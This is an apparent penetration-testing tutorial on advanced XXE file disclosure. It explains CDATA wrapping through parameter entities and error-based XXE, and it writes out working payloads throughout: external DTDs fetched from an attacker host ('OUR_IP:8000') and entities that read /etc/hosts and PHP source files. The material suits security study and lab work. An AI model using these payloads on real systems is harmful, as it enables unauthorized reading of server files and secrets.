# Advanced File Disclosure

Basic XXE file reading breaks when file contents contain XML special characters like `<`, `>`, or `&`, because these corrupt the entity reference before the parser can return the data. Two techniques get around this: wrapping file content in a [CDATA](https://www.w3.org/TR/xml/#sec-cdata-sect) section using parameter entities, and triggering deliberate parser errors that include file content in the error message.

***

## Advanced Exfiltration with CDATA

[CDATA sections](https://www.w3resource.com/xml/CDATA-sections.php) tell the XML parser to treat everything inside them as raw character data, ignoring any special characters. Wrapping a file's contents in `<![CDATA[ ... ]]>` prevents those contents from breaking the XML structure regardless of what they contain.

The naive approach of joining internal and external entities like this does not work because the XML specification blocks it:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

### Using XML Parameter Entities to Bypass the Limitation

[XML parameter entities](https://www.xml.com/pub/a/98/08/xmlqna0.html) are a special entity type that starts with `%` and can only be used inside a DTD. When all parameter entities are loaded from the same external source, the parser treats them all as external and allows them to be joined together.

The workaround uses two steps: write a small DTD file on your own machine, then reference it from the target application.

1. Create the DTD file and host it with Python:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

2. Send the following payload in the XML request to the target. It pulls in your hosted DTD and uses the `&joined;` entity to print the file contents through the reflected element:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

This returns the raw source code of the target file without any base64 encoding, making it faster to scan multiple files for secrets and passwords.

> Note: Some modern web servers block reading files like `index.php` directly because they prevent entity reference loops that could cause a DoS condition, as covered in the previous section.

***

## Error Based XXE

Error-based XXE applies when the application does not reflect any XML entity values in its output. If the application displays runtime errors such as PHP error messages without proper exception handling, those errors can be weaponised to carry file contents out of the server.

To confirm that the application throws visible errors, send malformed XML. Options include:

- Deleting a closing tag
- Changing a tag so it does not close properly, for example writing `<roo>` instead of `<root>`
- Referencing an entity that does not exist

If an error appears and reveals the server's directory path, the application is exploitable through this method.

### Setting Up the Error-Based DTD

The technique works by intentionally triggering an error that includes the target file's contents in the error message. Host the following DTD on your machine:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

This defines `%file;` as the target file, then defines `%error;` as an entity that references both a non-existing entity and the file contents. When the parser tries to resolve the non-existing entity, it throws an error that includes the value of `%file;` as part of the error string.

### Triggering the Payload

Call your external DTD from the vulnerable application and reference the `%error;` parameter entity:

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Host the DTD file first, then send the payload. No additional XML body is required. The server will return an error message containing the contents of `/etc/hosts`.

To read a different file, change the `file` entity path inside your DTD:

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
```

> Note: Error-based exfiltration is less reliable for source code reading than the CDATA method. It can hit length limits and certain special characters in the file may still break the output.
